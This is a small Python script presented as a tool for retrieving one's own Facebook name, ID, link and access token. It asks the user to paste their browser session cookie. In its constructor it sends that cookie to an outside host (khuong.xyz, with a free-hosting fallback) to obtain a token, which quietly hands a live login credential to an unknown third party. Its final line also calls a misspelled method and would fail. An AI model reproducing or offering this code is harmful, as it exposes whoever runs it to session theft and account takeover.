import requests,json

class __GET_INFOMATION__():
    def __init__(self,cookie):
        # link 1
        access_token=requests.get("http://khuong.xyz/gettk.php?cookie="+cookie).text
        # if Link 1 is not available ,you use link 2

        # link 2 
        #access_token=requests.get('http://phukhuong.000webhostapp.com/gettk.php?cookie='+cookie).text
        
        user_account=requests.get('https://graph.facebook.com/me?access_token='+access_token).text
        
        self.data=json.loads(user_account) # get file use json
        self.access_token=access_token
    
    def NAME(self):
        return self.data['name'] # get your name facebook
    def ID(self):
        return self.data['id'] # get your id facebook
    def LINK(self):
        return self.data['link'] # get your link facebook
    def ACCESS_TOKEN(self):
        return self.access_token

#*********************************************************************************#

if __name__=='__main__':
    cookie=' YOUR COOKIE FACEBOOK <F12> :D '
    _GET_=__GET_INFOMATION__(cookie)

    print(_GET_.NAME()) # print your name in facebook
    print(_GET_.ID()) # print your id in facebook
    print(_GET_.LINK()) # print your link in facebook
    print(_GET_.ACCESS_TOEKN()) # print your ACCESS_TOKEN in facebook
